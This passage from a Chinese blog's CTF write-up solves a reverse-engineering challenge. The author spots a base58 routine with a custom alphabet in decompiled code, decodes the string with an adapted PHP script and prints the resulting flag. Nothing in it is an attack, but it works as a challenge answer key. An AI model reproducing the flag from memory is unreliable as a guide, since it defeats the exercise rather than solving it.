0;</span><br><span class="line">    while ( j &lt; v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (v9 &lt;&lt; 8) + v12[j];</span><br><span class="line">      v12[j] = v1 / 58;</span><br><span class="line">      v9 = v1 % 58;</span><br><span class="line">      ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v5++;</span><br><span class="line">    s[v2] = v9;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>再加上用来取值的table 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy<br>意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$encode = <span class="string">"fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$encode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$decode = base58_decode($encode);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>.$decode;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_encode</span><span class="params">($string)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($string) === <span class="keyword">false</span> || !strlen($string)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $bytes = array_values(unpack(<span class="string">'C*'</span>, $string));</span></span><br><span class="line"><span class="php">    $decimal = $bytes[<span class="number">0</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($bytes); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $bytes[$i]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt;= $base) &#123;</span></span><br><span class="line"><span class="php">        $div = bcdiv($decimal, $base, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">        $mod = bcmod($decimal, $base);</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$mod];</span></span><br><span class="line"><span class="php">        $decimal = $div;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $output .= $alphabet[$decimal];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = strrev($output);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> (string) $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">base58_decode</span><span class="params">($base58)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $alphabet = <span class="string">'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'</span>;</span></span><br><span class="line"><span class="php">    $base = strlen($alphabet);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_string($base58) === <span class="keyword">false</span> || !strlen($base58)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $indexes = array_flip(str_split($alphabet));</span></span><br><span class="line"><span class="php">    $chars = str_split($base58);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($chars <span class="keyword">as</span> $char) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($indexes[$char]) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $decimal = $indexes[$chars[<span class="number">0</span>]];</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">1</span>, $l = count($chars); $i &lt; $l; ++$i) &#123;</span></span><br><span class="line"><span class="php">        $decimal = bcmul($decimal, $base);</span></span><br><span class="line"><span class="php">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $output = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">while</span> ($decimal &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $byte = bcmod($decimal, <span class="number">256</span>);</span></span><br><span class="line"><span class="php">        $output = pack(<span class="string">'C'</span>, $byte).$output;</span></span><br><span class="line"><span class="php">        $decimal = bcdiv($decimal, <span class="number">256</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $output;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>解码得到<br>sEcondBe5tTime1s_n0w}<br>flag到手<br>后来发现，拿这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
